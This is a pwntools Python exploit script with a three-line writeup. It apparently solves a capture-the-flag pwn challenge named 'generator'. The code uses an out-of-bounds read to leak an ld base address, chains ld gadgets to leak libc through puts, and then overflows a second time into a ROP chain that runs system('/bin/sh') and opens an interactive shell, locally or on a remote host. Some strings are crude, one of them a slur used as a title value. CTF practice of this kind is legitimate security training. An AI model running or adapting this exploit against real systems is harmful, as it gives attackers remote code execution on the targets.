#!/usr/bin/env python3
'''
Pwn3d by pwn2ooown
'''
from pwn import *
import sys
import time
context.log_level = "debug"
# context.terminal = ["tmux", "splitw", "-h"]
context.arch = "amd64"
def one_gadget(filename: str) -> list:
    return [
        int(i) for i in __import__('subprocess').check_output(
            ['one_gadget', '--raw', filename]).decode().split(' ')
    ]
# brva x = b *(pie+x)
# set follow-fork-mode 
# p/x $fs_base
# vis_heap_chunks
# set debug-file-directory /usr/src/glibc/glibc-2.35
# directory /usr/src/glibc/glibc-2.35/malloc/
# handle SIGALRM ignore
if len(sys.argv) == 1:
    r = process("./generator_patched")
    if args.GDB:
        gdb.attach(r,'b *0x401170\nb *0x401ff3')
    
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    print("Usage: python3 {} [GDB | REMOTE_IP PORT]".format(sys.argv[0]))
    sys.exit(1)
s       = lambda data               :r.send(data)
sa      = lambda x, y               :r.sendafter(x, y)
sl      = lambda data               :r.sendline(data)
sla     = lambda x, y               :r.sendlineafter(x, y)
ru      = lambda delims, drop=True  :r.recvuntil(delims, drop)
uu32    = lambda data,num           :u32(r.recvuntil(data)[-num:].ljust(4,b'\x00'))
uu64    = lambda data,num           :u64(r.recvuntil(data)[-num:].ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))
l64     = lambda      :u64(r.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
l32     = lambda      :u32(r.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))
def add(url,title):
    sla("choice:","1")
    sla(": ","1")
    sla(": ","1")
    sla(": ","1")
    sla(": ","1")
    sla(": ",url)
    sla(": ",title)

def edit(idx,url,title):
    sla("choice:","3")
    sla(": ",str(idx))  
    sla(": ","1")
    sla(": ","1")
    sla(": ","1")
    sla(": ","1")
    sla(": ",url)
    sla(": ",title)
sla("URL:",b'A'*1019+b'fuck')

add("pwn2ooown","30cm")
sla("choice:","3")
sla(": ","19")
sla(" x coordinate ","1")
sla("Enter new y coordinate","1")
sla("Enter new width (current: ","1")
ru("Enter new height (current: ")
leaked = int(ru(")"))
sl("1")
sla("URL","vincent55")
sla("title","gay")
ld = leaked - 0x3a040

pop_rdi = ld+0x00025e6b
pop_rsi = ld+0x0001f981
pop_rdx_rbx = ld+0x00020323
puts_local = 0x4010c0
fgets = 0x4010f0
main = 0x401ded
edit(18,'vincent55',cyclic(192)+p64(0x666)+p64(pop_rdi)+p64(0x405020)+p64(puts_local)+p64(main))

sla("choice:","5")
ru("P")
libc = u64(b'P'+r.recv(5)+b'\x00\x00') - 0x80e50
bin_sh = libc+0x1d8678
system = libc+0x50d70

sla("URL:",b'this challengeis shit')

add("vincent55","nogg")

edit(18,'vincent55',cyclic(192)+p64(0x666)+p64(pop_rdi)+p64(bin_sh)+p64(pop_rdi+1)+p64(system))
sla("choice:","5")

leak("ld",hex(leaked))
leak("libc",hex(libc))
r.interactive()

'''
Writeup:
Trivial oob, we can have a stable ld leak
Use pop rdi gadget in ld to leak got entry
return to main and trigger overflow again
'''